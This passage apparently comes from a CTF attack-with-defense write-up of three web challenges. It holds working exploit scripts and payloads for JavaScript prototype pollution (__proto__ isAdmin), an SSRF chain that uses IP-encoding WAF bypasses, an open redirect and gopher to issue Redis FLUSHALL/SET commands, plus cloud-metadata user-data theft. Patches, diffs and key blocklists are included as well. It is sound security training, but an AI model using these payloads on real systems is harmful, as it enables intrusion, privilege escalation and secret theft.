  const nextPreferences = clone(DEFAULT_PREFERENCES);
  merge(nextPreferences, incoming);                   // <-- attacker JSON reaches merge()
  savedPreferences = nextPreferences;
  sendJson(res, 200, {ok: true, preferences: savedPreferences});
}
```

`POST /api/preferences` feeds our raw JSON straight into `merge()`. The chain is complete:

```
POST /api/preferences  →  JSON.parse(body)  →  merge(clone(defaults), body)  →  Object.prototype pollution
                                                                                        │
GET /admin  →  currentUser().isAdmin  ◀───────── prototype chain lookup ────────────────┘
```

#### Why `__proto__` in JSON works

Two subtle mechanics make this exploitable:

1. **`JSON.parse` creates a real own `__proto__` key.** Unlike an object literal
   `{ __proto__: ... }` (which the JS engine treats as the prototype setter),
   `JSON.parse('{"__proto__": {...}}')` produces an object with an **own, enumerable
   property literally named `__proto__`**. So `for (const key in source)` iterates it.

2. **`merge` recurses into `target[key]`.** With `key === "__proto__"`,
   `target["__proto__"]` is the *getter*: it returns the object's prototype, i.e.
   `Object.prototype`. So the recursive call becomes:

   ```text
   merge(Object.prototype, { isAdmin: true });
   ```

   which executes `Object.prototype["isAdmin"] = true`. Global pollution achieved.

Note `isPlainObject` even *helps* the attacker: `{ isAdmin: true }` is a plain object,
so the code takes the recursive branch and descends into the prototype.

#### Exploitation

Two requests. First pollute, then collect the flag.

```bash
URL="https://eci-2ze5zaips9u93ispddb6.cloudeci1.ichunqiu.com:80"

# 1) Pollute Object.prototype.isAdmin = true
curl -sk -X POST "$URL/api/preferences" \
  -H 'Content-Type: application/json' \
  --data '{"__proto__":{"isAdmin":true}}'

# 2) Read the flag
curl -sk "$URL/admin"
```

Output:

```
=== pollute ===
{"ok":true,"preferences":{"theme":"ocean","layout":{...},"widgets":[...],"shortcuts":{...}}}

=== admin ===
<!doctype html><title>Admin</title><h1>Admin Console</h1><pre>flag{3019e7d8-30e4-489c-ad9e-908fac8b48c7}</pre>
```

The pollution response deliberately does **not** echo `isAdmin`; it only shows the
merged *preferences* object, whose own keys are the defaults. But the prototype has
been mutated process-wide, so the very next `GET /admin` returns the flag.

##### 4.1 Full exploit: `exploit.py`

A standalone, dependency-free (stdlib only) PoC. Full source in
[`exploit.py`](./exploit.py):

```python
#!/usr/bin/env python3
"""MyHome (AWDT 2026) — Prototype Pollution -> Admin auth bypass."""
import re, ssl, sys, json, urllib.request

DEFAULT_TARGET = "https://eci-2ze5zaips9u93ispddb6.cloudeci1.ichunqiu.com:80"

CTX = ssl.create_default_context()          # ignore self-signed CTF cert
CTX.check_hostname = False
CTX.verify_mode = ssl.CERT_NONE

def request(url, data=None):
    headers = {"Content-Type": "application/json"}
    body = json.dumps(data).encode() if data is not None else None
    req = urllib.request.Request(url, data=body, headers=headers,
                                 method="POST" if body is not None else "GET")
    try:
        with urllib.request.urlopen(req, context=CTX, timeout=15) as resp:
            return resp.read().decode(errors="replace")
    except urllib.error.HTTPError as e:      # /admin is 403 before pollution
        return e.read().decode(errors="replace")

def main():
    base = (sys.argv[1] if len(sys.argv) > 1 else DEFAULT_TARGET).rstrip("/")
    print(f"[*] Target: {base}")

    # Step 1: pollute Object.prototype.isAdmin = true
    print("[*] Sending prototype pollution payload to /api/preferences ...")
    print("    response:", request(f"{base}/api/preferences",
                                    {"__proto__": {"isAdmin": True}}))

    # Step 2: read the flag from /admin
    print("[*] Requesting /admin ...")
    admin = request(f"{base}/admin")
    m = re.search(r"flag\{[^}]+\}", admin)
    if m:
        print(f"[+] FLAG: {m.group(0)}")
    else:
        print("[-] Flag not found. Raw /admin response:\n" + admin)
        sys.exit(1)

if __name__ == "__main__":
    main()
```

Run it:

```console
$ python3 exploit.py https://eci-2ze5zaips9u93ispddb6.cloudeci1.ichunqiu.com:80
[*] Target: https://eci-2ze5zaips9u93ispddb6.cloudeci1.ichunqiu.com:80
[*] Sending prototype pollution payload to /api/preferences ...
    response: {"ok":true,"preferences":{"theme":"ocean", ...}}
[*] Requesting /admin ...
[+] FLAG: flag{3019e7d8-30e4-489c-ad9e-908fac8b48c7}
```

> `json.dumps({"__proto__": {"isAdmin": True}})` emits `{"__proto__": {"isAdmin": true}}`.
> Python keeps `__proto__` as an ordinary string key, and on the Node side
> `JSON.parse` turns it into an own property that drives the pollution (see §3).

> **AWD note:** the pollution persists for the lifetime of the Node process. Once any
> attacker pollutes the shared prototype, every guest hitting `/admin` sees the flag
> until the service restarts.

#### Defense

The defensive half of the challenge requires uploading a `.gz` (≤150 MB) containing an
`update.sh`. Constraints given by the platform:

- Project path: `/app/`
- **Whitelisted commands in `update.sh`: `mv`, `cp`, `rm` only**
- After `update.sh` runs, the service auto-restarts.

##### 5.1 Code fix (two layers of defense)

**Layer 1, kill the pollution primitive in `merge()`:** skip inherited keys and
explicitly blacklist the dangerous ones.

```text
const FORBIDDEN_KEYS = new Set(["__proto__", "constructor", "prototype"]);

function merge(target, source) {
  for (const key in source) {
    if (!Object.prototype.hasOwnProperty.call(source, key)) {
      continue;                 // ignore anything not an own property
    }
    if (FORBIDDEN_KEYS.has(key)) {
      continue;                 // never merge prototype-mutating keys
    }
    const value = source[key];
    if (isPlainObject(value)) {
      if (!target[key]) {
        target[key] = {};
      }
      merge(target[key], value);
    } else {
      target[key] = value;
    }
  }
  return target;
}
```

**Layer 2, harden the sink so a future pollution vector still can't grant admin:**
require an **own** `isAdmin` that is strictly `true`.

```text
function handleAdmin(res) {
  const user = currentUser();
  if (Object.prototype.hasOwnProperty.call(user, "isAdmin") && user.isAdmin === true) {
    send(res, 200, `...<pre>${readFlag()}</pre>`);
    return;
  }
  send(res, 403, "...Administrator access required.");
}
```

Either layer alone stops this exploit. Together they hold up against other pollution
gadgets that might exist elsewhere.

##### 5.2 `update.sh` (whitelist-compliant)

The archive extracts to a root containing `update.sh` and `app/server.js`. A single
`cp`, with no shell built-ins, no flags, and no command substitution. An earlier version using
`dirname`/`cd`/`pwd` was rejected as a *syntax error* because those aren't whitelisted:

```sh
cp app/server.js /app/server.js
```

##### 5.3 Building the submission

```bash
mkdir -p patch/app
cp patched-server.js patch/app/server.js
printf 'cp app/server.js /app/server.js\n' > patch/update.sh

cd patch
tar -czf ../patch.tar.gz update.sh app/server.js
```

Archive layout:

```
patch.tar.gz
├── update.sh          # cp app/server.js /app/server.js
└── app/
    └── server.js      # patched source
```

##### 5.4 Verifying the patch locally

```bash
PORT=8123 FLAG_PATH=/nonexistent node server.js &

# attack now fails
curl -s -X POST localhost:8123/api/preferences \
  -H 'Content-Type: application/json' --data '{"__proto__":{"isAdmin":true}}'
curl -s localhost:8123/admin
# -> <h1>Forbidden</h1> Administrator access required.

# legitimate functionality unaffected
curl -s -X POST localhost:8123/api/preferences \
  -H 'Content-Type: application/json' --data '{"theme":"dark","layout":{"columns":5}}'
# -> {"ok":true,"preferences":{"theme":"dark","layout":{...,"columns":5,...},...}}
```

- Prototype pollution → **blocked** (`/admin` stays `403`).
- Normal nested preference merges → **still work** (`theme`, `layout.columns` update correctly).

##### 5.5 Full patch diff

The complete change against the original `server.js` is two edits, both minimal.
Nothing else in the file moves, so behavior for legitimate requests is untouched.

```diff
--- a/server.js
+++ b/server.js
@@ -34,8 +34,16 @@
   return value !== null && typeof value === "object" && !Array.isArray(value);
 }
 
+const FORBIDDEN_KEYS = new Set(["__proto__", "constructor", "prototype"]);
+
 function merge(target, source) {
   for (const key in source) {
+    if (!Object.prototype.hasOwnProperty.call(source, key)) {
+      continue;
+    }
+    if (FORBIDDEN_KEYS.has(key)) {
+      continue;
+    }
     const value = source[key];
     if (isPlainObject(value)) {
       if (!target[key]) {
@@ -124,7 +132,7 @@
 
 function handleAdmin(res) {
   const user = currentUser();
-  if (user.isAdmin) {
+  if (Object.prototype.hasOwnProperty.call(user, "isAdmin") && user.isAdmin === true) {
     send(res, 200, `<!doctype html><title>Admin</title><h1>Admin Console</h1><pre>${readFlag()}</pre>`);
     return;
   }
```

Why each hunk matters:

- The **`merge()`** hunk closes the primitive. The `hasOwnProperty` guard drops keys
  inherited through the prototype chain, and the `FORBIDDEN_KEYS` check rejects
  `__proto__`, `constructor`, and `prototype` outright. The attacker's
  `{"__proto__":{"isAdmin":true}}` now hits the `continue` and never reaches the
  assignment, so `Object.prototype` is never touched.
- The **`handleAdmin()`** hunk fixes the sink. Reading `user.isAdmin` alone trusts the
  prototype chain; requiring an *own* property that is strictly `true` means a polluted
  prototype cannot satisfy the check even if some other gadget slips through.

##### 5.6 Submission checklist

- [x] `merge()` rejects prototype-mutating keys and inherited keys.
- [x] `handleAdmin()` gates on an own `isAdmin === true`.
- [x] `node -c server.js` passes (no syntax errors in the patched file).
- [x] `update.sh` uses only whitelisted commands (`cp`), no built-ins or substitution.
- [x] Archive is a `.tar.gz` under 150 MB with `update.sh` at the root and the patched
      `app/server.js` beside it.
- [x] Exploit re-run against the patched service returns `403`, legitimate preference
      updates still return `200`.

Once uploaded, `update.sh` copies the patched file to `/app/server.js` and the platform
restarts the service, closing the flag leak on `/admin` while `/api/preferences` keeps
working for normal users.

#### Root cause

- **Root cause:** a recursive object merge that trusts attacker-controlled keys,
  combined with an authorization check that reads a property off the prototype chain
  instead of an own property.
- **Prototype pollution is an *authz* bug here, not just a curiosity.** The single
  planted `Object.prototype.isAdmin` flips a security decision for every object.

**General mitigations:**

1. **Filter keys** in any recursive merge/clone: reject `__proto__`, `constructor`,
   `prototype`; iterate own properties only.
2. **Use null-prototype containers** (`Object.create(null)`) or `Map` for
   attacker-influenced dictionaries so there is no prototype to pollute.
3. **Make authorization decisions on own properties / explicit values**
   (`Object.hasOwn(user, "isAdmin") && user.isAdmin === true`), never on truthiness of
   an inherited lookup.
4. Prefer a vetted deep-merge (e.g. `lodash.merge` ≥ patched versions, or libraries
   that guard prototype keys) over hand-rolled recursion.
5. Consider `Object.freeze(Object.prototype)` at process start as a blunt but effective
   backstop against runtime prototype mutation.

#### Timeline

1. `POST /api/preferences` with `{"__proto__":{"isAdmin":true}}` → pollutes `Object.prototype.isAdmin`.
2. `GET /admin` → `user.isAdmin` resolves `true` via prototype → flag disclosed.
3. Patch `merge()` (key blacklist + own-prop check) and `handleAdmin()` (own-prop `=== true`).
4. Ship `update.sh` = `cp app/server.js /app/server.js`, packed as `patch.tar.gz`.
```
flag{3019e7d8-30e4-489c-ad9e-908fac8b48c7}
```

---

### External Link Inspection

> AWDP (Attack-With-Defense Plus) · Web · Medium · 5 pts
> Platform: ichunqiu ECI (`cloudeci1.ichunqiu.com`)
> App: Flask/Werkzeug, `app.py` at `/app/app.py`, restart after `update.sh`
> Patch whitelist: `['mv', 'cp', 'chmod']`
> Example flag: `flag{a415fa68-db01-477a-84d4-de8b00321002}` (per-instance)


#### Overview

The service is an "external link inspection" bot: you submit a URL, the backend fetches it and returns a short text preview. The homepage leaves a telling comment:

```html
<!-- TODO: 内部调试接口已迁移至 /internal/ 路径下，仅限本机调用 -->
<!-- Internal debug interfaces migrated under /internal/, local-only -->
```

So debug APIs live under `/internal/` and are loopback-restricted, a classic **SSRF** setup. The flag is gated behind `/claim`, which needs an authorization "grant" synced to Redis. The whole challenge is an SSRF chain that lets an attacker reach Redis, set the grant, and read the flag.

This is AWDP, so there are two scoring lanes:
- **Attack**: submit the flag (5 pts/round, plus blood bonuses).
- **Defense**: upload a patch package that fixes the vuln without breaking the platform's health-check (5 pts/round).


#### Recon

##### Endpoints

| Route | Method | Purpose |
|---|---|---|
| `/` | GET | Homepage (UI) |
| `/preview` | POST | Core: `url=` fetches target, returns `{"preview": "...", "success": true}` |
| `/api/info` | GET | Service info JSON |
| `/claim` | GET | Flag endpoint (grant-gated) |
| `/__grant_source_<hash>/app.py` | GET | Source leak (also grant-gated) |
| `/internal/cache/status` | GET | Internal status (local-only) |
| `/internal/redirect` | GET | Internal redirect helper (local-only) |
| `/internal/<path:sub>` | GET | Catch-all hint (local-only) |

##### WAF probe

```
POST /preview  url=http://127.0.0.1:5000/
→ {"message":"Request blocked by preview WAF","success":false}
```

`/preview` is guarded by a substring blocklist WAF (blocks `127.0.0.1`, `localhost`, `172.16.`, `gopher://`, `[::1]`, …). It is pure string matching and never resolves the host.

##### The hint map (`/internal/cache/status`)

Reaching it via a decimal-IP bypass (below) returns the author's roadmap:

```text
{
  "component": "grant-cache",
  "upstream": "cache-gw:6379",
  "namespace": "web1 / internal / grant",
  "accepted_state": "approved by internal redis",
  "loopback_alias": "127.1",
  "handoff": "local redirect helper is enabled"
}
```

- `loopback_alias: 127.1` → WAF-bypass technique (loopback short form / decimal IP).
- `namespace` → the Redis grant key namespace.
- `accepted_state` → the grant value (decoy: the real value uses hyphens, see §3.4).
- `upstream: cache-gw:6379` → Redis location.
- `handoff: local redirect helper is enabled` → `/internal/redirect` is the pivot.


#### The vulnerability chain

```
 attacker
    │  POST /preview  url=http://2130706433:5000/internal/redirect?next_b64=<gopher redis SET>
    ▼
 /preview  (WAF: substring blocklist)
    │  ① decimal IP "2130706433" bypasses the WAF (not a blocked string)
    ▼
 /internal/redirect  (local-only; SSRF origin is 127.0.0.1, passes)
    │  ② open redirect: 302 → gopher://127.0.0.1:6379/...
    ▼
 fetch_url follows the 302  ③ does NOT re-validate the redirect target scheme → gopher branch
    │
    ▼
 Redis (6379)   ④ SET web1:internal:grant "approved-by-internal-redis"
    │
    ▼
 GET /claim  →  ⑤ grant passes → returns the Flag
```

Five weaknesses, each a necessary link.


#### Attack, step by step

##### 3.1 SSRF + WAF bypass (decimal IP)

The WAF does `token in url.lower()` substring matching and never resolves the host. `127.0.0.1` is blocked, but every encoding below resolves to `127.0.0.1` and is not a blocked string:

| Encoding | Example |
|---|---|
| Decimal | `http://2130706433:5000/` |
| Hex | `http://0x7f000001:5000/` |
| Octal | `http://0177.0.0.1:5000/` |
| Short form | `http://127.1:5000/` |
| All-zeros | `http://0.0.0.0:5000/` |
| IPv4-mapped IPv6 | `http://[::ffff:127.0.0.1]:5000/` |

```
POST /preview  url=http://2130706433:5000/internal/cache/status
→ returns the internal JSON (we've reached the local service)
```

`/internal/*` is gated by `request.remote_addr in ("127.0.0.1","::1")`; the SSRF connection originates from 127.0.0.1, so it passes automatically.

##### 3.2 Open redirect (`/internal/redirect`)

`/internal/redirect?next_b64=<base64url>` base64-decodes its input and issues a raw `302` with the `Location` header set to whatever that decoded value is, with no validation:

```python
target = base64.urlsafe_b64decode(encoded + "==").decode()
response = app.response_class("redirecting", status=302)
response.headers["Location"] = target
return response
```

`fetch_url` then manually follows the 302 without re-checking the WAF or the scheme:

```python
response = requests.get(url, timeout=3, allow_redirects=False)
if 300 <= response.status_code < 400 and response.headers.get("Location"):
    return fetch_url(urljoin(url, response.headers["Location"]), depth + 1)[:800]
```

So:
- `/preview`'s WAF only inspects the *initial* URL, `http://2130706433:5000/internal/redirect?...` (decimal IP, passes).
- The redirect `target` is entirely outside the WAF and may be any scheme or any host.

##### 3.3 Gopher → Redis SSRF

`fetch_url` routes `gopher://` to `fetch_gopher`, which URL-decodes the path and writes it raw to a socket. Point the open-redirect target at `gopher://127.0.0.1:6379/_<RESP>` and you send arbitrary Redis commands:

```
next_b64 = base64(gopher://127.0.0.1:6379/_PING\r\n)
POST /preview url=http://2130706433:5000/internal/redirect?next_b64=...
→ {"preview":"+PONG\r\n","success":true}   ← Redis is alive
```

This gopher path is only reachable through the open redirect. `/preview`'s own WAF blocks the `gopher://` string, but the 302 escape skips the WAF entirely.

##### 3.4 The `/claim` grant gate

`/claim` directly:

```
GET /claim
→ {"message":"授权流程尚未完成，请通过内部缓存网关完成授权状态同步","success":false}
```

Logic (recoverable from the source-leak route after granting):

```python
def has_internal_grant():
    return get_redis_client().get("web1:internal:grant") == "approved-by-internal-redis"
```

So: set `web1:internal:grant` to `approved-by-internal-redis` and `/claim` returns the flag. Redis is writable via the gopher SSRF.

###### Blind key discovery: the WRONGTYPE trick

I knew `/claim` did a `GET`, but not the exact key, and `MONITOR` was unusable (the gopher fetcher reads one response then closes). The fix: set candidate keys to the wrong type (list) so the `GET` raises WRONGTYPE.

1. An `INFO commandstats` delta confirms `/claim` uses `get` (call it N times, `cmdstat_get` rises by N).
2. `LPUSH` every candidate key, then hit `/claim`:

```
→ "内部授权服务异常: WRONGTYPE Operation against a key holding the wrong kind of value"
```

W RONGTYPE means `/claim`'s GET hit one of the candidates. Binary-search the candidate list (set half as lists each round) to converge in O(log n):

```
key = web1:internal:grant
```

###### Value brute-force

The hint `accepted_state: "approved by internal redis"` (spaces) is a decoy. The real accepted value uses hyphens:

```
value = approved-by-internal-redis
```

##### 3.5 Capture the flag

```bash
# 1) Write the grant via the SSRF chain (RESP protocol supports values with spaces)
python3 exploit.py set-grant
# 2) Read the flag
curl -sk https://eci-2zeefb13f7r1ve1eidkz.cloudeci1.ichunqiu.com:5000/claim
```

```text
{
  "flag": "flag{a415fa68-db01-477a-84d4-de8b00321002}",
  "message": "内部授权校验通过",
  "source": "/__grant_source_7e9c3b2a6f514d0aa1d8e4c29b67f0e3/app.py",
  "success": true
}
```

Flag obtained. Bonus: the `source` field is a source-leak route; once `/claim` passes you can `curl` it to download the full `app.py` and review the logic.


#### Full exploit (PoC)

```python
#!/usr/bin/env python3
import base64, json, subprocess
TARGET = "https://eci-2zeefb13f7r1ve1eidkz.cloudeci1.ichunqiu.com:5000/preview"
BASE   = "http://2130706433:5000"          # decimal 127.0.0.1, bypasses the WAF

def via_redirect(next_url, timeout=25):
    """/preview -> /internal/redirect (open 302) -> fetch_url follows to next_url"""
    nb = base64.urlsafe_b64encode(next_url.encode()).decode()
    url = f"{BASE}/internal/redirect?next_b64={nb}"
    return subprocess.run(["curl","-sk","--max-time",str(timeout),TARGET,
                           "--data-urlencode",f"url={url}"],
                          capture_output=True, text=True).stdout

def gopher(host, port, data_bytes, timeout=25):
    enc = "".join("%%%02x" % b for b in data_bytes)
    return via_redirect(f"gopher://{host}:{port}/_{enc}", timeout)

def resp(*args):
    """RESP protocol (handles values with spaces; inline protocol cannot)."""
    out = ("*%d\r\n" % len(args)).encode()
    for a in args:
        a = a.encode() if isinstance(a, str) else a
        out += b"$%d\r\n" % len(a) + a + b"\r\n"
    return out

# 1) Write the grant
gopher("127.0.0.1", 6379, resp("FLUSHALL",
      "SET", "web1:internal:grant", "approved-by-internal-redis"))

# 2) Claim the flag
r = subprocess.run(["curl","-sk","--max-time","15",
      TARGET.replace("/preview","/claim")], capture_output=True, text=True).stdout
print(json.loads(r)["flag"])
```


#### Bonus: cloud metadata SSRF

The open redirect also reaches the Aliyun ECI metadata service (no re-check after the redirect):

```
next_b64 = base64(http://100.100.100.200/latest/user-data/)
POST /preview url=http://2130706433:5000/internal/redirect?next_b64=...
```

`/latest/user-data/` is `base64(gzip(kubepod_spec))`, and the flag is embedded as the `ICQ_FLAG` env var:

```
... | base64 -d | gzip -d
→ ..."name":"ICQ_FLAG","value":"flag{...}"...
```

Note: `/preview` truncates to 800 chars and user-data is 2352, so this path yields only a partial flag (cut mid-UUID). The complete flag must come through `/claim`. Metadata is the "almost-there" alternate line and shows the SSRF's blast radius.


#### Defense

This part took the most iteration. AWDP defense must do two things at once:
1. Break the attack (flag no longer obtainable).
2. Preserve the platform's health-check (else `check檢測失敗`, no score).

##### 6.1 The wrong fix (and why it fails)

The intuitive fix is to harden `/preview`'s WAF to block loopback addresses: resolve the host, reject `127.0.0.0/8`, decimal/hex/octal encodings, and so on.

This fails the check. The platform's health/SLA check verifies the preview worker by fetching the internal cache status over the same decimal-IP loopback path the attack uses:

```
health-check ≈ POST /preview url=http://2130706433:5000/internal/cache/status
```

Block loopback and the health-check is blocked too, so `check檢測失敗`. Do not block loopback addresses.

##### 6.2 The correct fix: re-validate redirect hops

The attack's essential enabler is that `fetch_url` follows the open-redirect's `302` to a `gopher://` target without re-validating the scheme. The health-check, by contrast, is a direct fetch that returns `200` (no redirect). So the fix is: when following a redirect, only allow `http`/`https` targets (and drop the gopher branch). This breaks the `302 → gopher → Redis` escape while leaving every direct fetch, including the loopback health-check, untouched.

Patch `fetch_url` only:

```python
def fetch_url(url, depth=0):
    if depth > 3:
        return "Redirect limit exceeded"
    parsed = urlparse(url)
    if parsed.scheme in ("http", "https"):
        response = requests.get(url, timeout=3, allow_redirects=False)
        if 300 <= response.status_code < 400 and response.headers.get("Location"):
            next_url = urljoin(url, response.headers["Location"])
            # re-validate the redirect target scheme — closes the 302→gopher escape
            if urlparse(next_url).scheme not in ("http", "https"):
                return "Blocked: unsafe redirect target"
            return fetch_url(next_url, depth + 1)[:800]
        return response.text[:800]
    return "Unsupported protocol"   # gopher (and all non-web schemes) disabled
```

Result:
- Health-check (`http://2130706433:5000/internal/cache/status`, direct `200`): unaffected.
- Attack (`→ /internal/redirect → 302 → gopher://…`): redirect target rejected, Redis never reached, grant never set, `/claim` stays locked.
- Every route, response format, and business function preserved (minimal-change compliant).

##### 6.3 Patch package structure (ichunqiu AWDP)

The accepted package is a `tar.gz` whose top level contains an `update/` directory with a script named exactly `update.sh` plus the files to change. The platform auto-`chmod +x`'s the script, runs it, then restarts the service. `update.sh` may use only the whitelisted commands (`mv`/`cp`/`chmod`); no `for`/`if`/`[`/`echo` (the validator flags them as "syntax error").

Layout that worked (patched file path mirrors the target so `cp` is unambiguous):

```
update.tar.gz
├── app/
│   └── app.py        ← patched app.py (path mirrors /app/app.py)
└── update/
    └── update.sh
```

`update/update.sh`:
```sh
#!/bin/sh
cp app/app.py /app/app.py
chmod 644 /app/app.py
```

LF line endings are required (`tar zcvf update.tar.gz update app` on Linux).

##### 6.4 Submission mechanics (ichunqiu blue/defense API)

- Submit the `tar.gz` via the 防禦 (defense) upload; the platform runs `update.sh`, restarts, and runs check.
- API result meanings: `status=1` is pass (defense scores each round); `error_code=4` is "vuln still exploitable" (the patch didn't break the attack); other errors cover structure/syntax.
- The platform MD5-dedups uploads, so re-submitting a byte-identical file returns 文件重复 (duplicate). Change a byte if you need to retry the same logic.

##### 6.5 Pitfalls that cost real attempts

| Symptom | Cause |
|---|---|
| `update.sh 存在語法錯誤` | script used `for`/`if`/`[`/`echo` or wrong name; use only `cp`/`mv`/`chmod`, name it `update.sh`, put it in `update/` |
| `check檢測失敗` (attack still works) | `update.sh` didn't install: wrong source path or root-owned target. Mirror the path (`cp app/app.py /app/app.py`) and use `cp -f` if needed |
| `check檢測失敗` (service "up" but no score) | WAF blocked the loopback health-check. Fix the redirect hops instead of the address |
| All checks suddenly fail + `502 容器不存在` | the ECI container expired. Re-deploy (重新下发) from the platform |


#### Timeline

1. Recon → found `/preview`, `/claim`, `/internal/*`.
2. Decimal-IP WAF bypass → read `/internal/cache/status` hint map.
3. Discovered `/internal/redirect` open redirect; `fetch_url` follows 302 without re-validation.
4. Redirect target = `gopher://` → Redis SSRF.
5. `/claim` message → Redis grant; `INFO commandstats` confirmed `get`.
6. WRONGTYPE blind discovery + binary search → key `web1:internal:grant`; value `approved-by-internal-redis`.
7. `/claim` → flag.
8. Defense iteration: loopback-blocking failed (broke the health-check), so I switched to redirect-hop re-validation, which passed.
9. Container expired mid-work → re-deployed → final patch accepted.


#### Takeaways

- SSRF WAFs that match strings instead of resolving are bypassable by every IP encoding (decimal/hex/octal/short/IPv6-mapped). The `loopback_alias` hint was the giveaway.
- Open redirects plus blind redirect-following are a full SSRF multiplier: the initial-URL WAF is moot if the redirect target isn't re-validated.
- Gopher lives as long as the fetcher supports it, and Redis SSRF follows immediately.
- Blind key discovery via WRONGTYPE (set candidate keys to the wrong type, watch the app error, binary-search) solves "I have Redis but don't know the key" without source or MONITOR.
- Defense is not maximal blocking. The platform's own health-check often exercises the very loopback path the attack uses, so the right fix is to break the chain (redirect re-validation), not the address. Over-blocking earns `check檢測失敗`.
- AWDP packaging is fiddly: exact script name, `update/` dir, whitelist-only commands, LF endings, path-mirrored `cp`. ECI containers also expire, so watch for `502 容器不存在`.


#### Flag

```
flag{a415fa68-db01-477a-84d4-de8b00321002}
```

---

### Profile Forge

| | |
|---|---|
| **Difficulty** | Medium |
| **Points** | 5 |
| **Flag** | `flag{b11c8e15-5fca-4d1b-b3bd-3fd78714a3e9}` |


#### Overview

> Profile Forge is a personal profile import center. Users can submit a JSON profile
> document to update display information, contact preferences, privacy settings, and
> dashboard modules. The backend is a Node.js Express application. To avoid mutating
> defaults, it first performs a handwritten deep clone and then merges the imported
> JSON into the current profile.

The application accepts a JSON "import document", validates some metadata, clones a
default profile, and then **recursively merges** the attacker-controlled `profile`
object into it. The provided source is a single file, `src/profileStore.js`, which
holds the clone and merge logic. That is the exact code path an attacker controls.

The task has two phases:

1. **Attack:** exploit the app to read the flag from `/admin/audit`.
2. **Defense:** ship a patch (`.tar.gz` with an `update.sh`) that closes the bug while
   keeping the app working.


#### Recon

##### Homepage (`/`)

The console page reveals the client-side flow via an inline `<script>`:

```text
// import
const response = await fetch("/api/profile/import", {
  method: "POST",
  headers: {"Content-Type": "application/json"},
  body: JSON.stringify(payload)
});

// session / admin state
async function refreshSession() {
  const response = await fetch("/api/session");
  const data = await response.json();
  viewerName.textContent = data.viewer.displayName;
  adminState.textContent = String(data.viewer.isAdmin);   // <-- interesting
}
```

##### Endpoints

| Method | Path                   | Purpose                                             |
| ------ | ---------------------- | --------------------------------------------------- |
| GET    | `/api/profile`         | Returns current active profile                      |
| POST   | `/api/profile/import`  | Imports a JSON document (the vulnerable sink)        |
| GET    | `/api/session`         | Returns `{ viewer: { ..., isAdmin } }`              |
| GET    | `/admin/audit`         | Admin-only; returns the flag if `viewer.isAdmin`    |

Baseline responses:

```
$ curl -sk https://eci-2ze5moyf27tohdauwxot.cloudeci1.ichunqiu.com:80/api/session
{"viewer":{"username":"guest","displayName":"Guest Viewer","role":"member","isAdmin":false}}

$ curl -sk https://eci-2ze5moyf27tohdauwxot.cloudeci1.ichunqiu.com:80/admin/audit
<!doctype html><title>Forbidden</title><h1>Forbidden</h1><p>Admin audit access required.</p>
```

So the goal is clear: make the server believe **`viewer.isAdmin === true`**.


#### Vulnerability analysis

The full `src/profileStore.js` (verbatim, abbreviated to the two relevant functions):

```text
function isObject(value) {
  return value !== null && typeof value === "object" && !Array.isArray(value);
}

function deepCopy(value) {
  if (Array.isArray(value)) {
    return value.map(item => deepCopy(item));
  }
  if (isObject(value)) {
    const out = {};
    for (const key in value) {          // (1) for..in walks inherited keys too
      out[key] = deepCopy(value[key]);
    }
    return out;
  }
  return value;
}

function mergeProfile(target, source) {
  for (const key in source) {           // (2) key can be "__proto__"
    const value = source[key];
    if (isObject(value)) {
      if (!target[key]) {               // (3) target["__proto__"] is truthy → kept
        target[key] = {};
      }
      mergeProfile(target[key], value); // (4) recurse INTO Object.prototype
    } else {
      target[key] = deepCopy(value);
    }
  }
  return target;
}
```

This is **prototype pollution** through a recursive merge.

##### Why it pollutes

When the attacker sends:

```text
{ "profile": { "__proto__": { "isAdmin": true } } }
```

`JSON.parse` produces an object with an **own, enumerable** property literally named
`__proto__` (JSON is not affected by the accessor magic that object literals have).

Walking the merge:

1. `for (const key in source)` yields `key = "__proto__"` (2).
2. `value = { isAdmin: true }` is an object.
3. `target["__proto__"]` evaluates the target's prototype, `Object.prototype`,
   which is truthy, so the `if (!target[key])` guard does **not** reset it (3).
4. `mergeProfile(Object.prototype, { isAdmin: true })` recurses **into the shared
   prototype** (4) and executes `Object.prototype["isAdmin"] = true`.

From that point on, every plain object in the process inherits `isAdmin === true`,
including the `viewer` object that `/api/session` and `/admin/audit` build on each
request. The admin check `viewer.isAdmin` reads the polluted prototype and returns
`true`.

> Note: `deepCopy` has the same `for..in` weakness (1). It copies inherited keys, so
> the polluted value spreads into every returned object too, but the merge is the
> actual pollution primitive.


#### Exploitation

Single request pollutes the prototype; a second request reads the flag.

```bash
B="https://eci-2ze5moyf27tohdauwxot.cloudeci1.ichunqiu.com:80"

# 1) Pollute Object.prototype.isAdmin = true
curl -sk -X POST "$B/api/profile/import" \
  -H 'Content-Type: application/json' \
  -d '{"importOptions":{"mode":"merge","source":"portal"},
       "profile":{"__proto__":{"isAdmin":true}}}'

# 2) Now the viewer inherits isAdmin
curl -sk "$B/api/session"
# {"viewer":{...,"isAdmin":true}}

# 3) Admin audit unlocks the flag
curl -sk "$B/admin/audit"
```

The `importOptions` metadata (`mode: "merge"`, `source: "portal"`) is mandatory.
`normalizeImportDocument()` throws without it.

**Result:**

```
== import pollution ==
{"ok":true,"profile":{ ... ,"isAdmin":true}}

== session ==
{"viewer":{"username":"guest","displayName":"Guest Viewer","role":"member","isAdmin":true}}

== audit ==
<!doctype html>
<title>Audit Console</title>
<h1>Audit Console</h1>
<p>Current profile import audit is available.</p>
<pre>flag{b11c8e15-5fca-4d1b-b3bd-3fd78714a3e9}</pre>
```

The `isAdmin:true` value shows up in every nested object of the import response
(`privacy`, `dashboard`, `integrations`), which confirms the prototype was polluted.

##### Automated exploit (`exploit.py`)

```python
#!/usr/bin/env python3
"""Profile Forge — Prototype Pollution -> Auth Bypass -> Flag"""
import sys, re, json, urllib3, requests
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def exploit(base):
    base = base.rstrip("/")
    s = requests.Session(); s.verify = False
    payload = {
        "importOptions": {"mode": "merge", "source": "portal"},
        "profile": {"__proto__": {"isAdmin": True}},
    }
    print("[*] Sending prototype pollution import ...")
    r = s.post(f"{base}/api/profile/import", json=payload,
               headers={"Content-Type": "application/json"})
    print(f"    import  -> {r.status_code}: {r.text[:120]}")

    print("[*] Checking session state ...")
    r = s.get(f"{base}/api/session")
    try:
        is_admin = r.json().get("viewer", {}).get("isAdmin")
    except json.JSONDecodeError:
        is_admin = None
    print(f"    session -> viewer.isAdmin = {is_admin}")
    if not is_admin:
        print("[!] Pollution did not take — aborting."); return 1

    print("[*] Fetching /admin/audit ...")
    r = s.get(f"{base}/admin/audit")
    m = re.search(r"flag\{[^}]+\}", r.text)
    if m:
